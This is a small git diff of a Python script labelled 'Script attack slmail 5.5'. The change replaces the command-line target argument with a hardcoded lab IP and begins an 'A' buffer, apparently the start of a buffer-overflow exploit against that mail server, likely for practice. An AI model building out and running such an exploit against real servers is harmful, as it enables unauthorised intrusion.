@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding:utf-8 -*-
 import socket
-import sys
+
 
 logo = """\n
 	Script attack slmail 5.5
@@ -12,12 +12,7 @@ logo = """\n
 
 """
 
-if len(sys.argv) != 2:
-    print "uso: python %s <ip> " % (sys.argv[0])
-    print logo
-    sys.exit(0)
-
-host = sys.argv
+host = "192.168.0.16"
 print logo 
 
 buffer=["A"]
